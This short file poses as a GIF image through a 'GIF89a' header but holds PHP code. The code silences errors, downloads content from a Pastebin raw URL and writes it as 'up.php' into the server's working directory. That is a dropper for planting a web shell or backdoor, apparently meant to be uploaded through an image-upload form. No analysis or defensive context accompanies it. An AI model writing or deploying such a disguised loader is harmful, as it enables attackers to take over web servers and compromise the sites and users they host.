GIF89a;
<?php 
error_reporting(0);
$filename="up.php";
$fget=file_get_contents("https://pastebin.com/raw/ntq2g95Z");
$path=getcwd().DIRECTORY_SEPARATOR;
$fileopen=fopen("$path/$filename",'w'); $execfile=fwrite($fileopen,$fget);
if($execfile) 	{
echo "Success: $path$filename";
} else {
echo "Failed execute newfile $filename in $path";
} 
?>